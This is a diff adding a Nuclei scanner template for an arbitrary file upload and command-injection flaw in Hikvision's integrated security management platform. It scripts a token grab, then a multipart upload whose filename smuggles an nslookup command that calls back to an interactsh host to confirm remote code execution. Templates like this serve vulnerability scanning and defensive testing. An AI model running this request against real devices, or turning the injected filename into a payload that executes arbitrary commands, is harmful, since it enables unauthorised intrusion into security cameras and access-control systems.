@@ -1,0 +1,49 @@
+id: hikvision-isecure-center-productfile-fileupload
+info:
+  name: 海康威视-综合安防管理平台 /svm/api/v1/productFile 路径存在任意文件上传
+  author: qwtd
+  severity: critical
+  description: |
+    海康威视综合安防管理平台 /svm/api/v1/productFile 路径存在任意文件上传漏洞，攻击者可以利用该漏洞上传恶意文件导致远程代码执行。
+  reference:
+    - https://github.com/adysec/nuclei_poc/blob/3a7b6f7091bd9a293d8d41543b212b586e652c94/poc/remote_code_execution/hikvision_productfile_rce.yaml#L7
+    - https://mp.weixin.qq.com/s/Vy5iEG6YVOHROBieXvX8fg
+  tags: HIKVISION-综合安防管理平台
+  classification:
+    cwe-id: CWE-434
+http:
+  - raw:
+      - |
+        GET /iac/iasService/v1/register HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /svm/api/v1/productFile?type=product&ip=127.0.0.1&agentNo=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=------6c7a1966e0294e1cb89b06b95cf3da84
+        Token: {{token}}
+        Content-Length: 191
+        Connection: close
+
+        --------6c7a1966e0294e1cb89b06b95cf3da84
+        Content-Disposition: form-data; name="file";filename="`nslookup {{interactsh-url}} 8.8.8.8`.zip"
+
+        123456
+        --------6c7a1966e0294e1cb89b06b95cf3da84--
+    extractors:
+      - type: kval
+        name: token
+        internal: true
+        part: header
+        kval:
+          - token
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 403
+          - status_code_2 == 200
+        condition: and
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
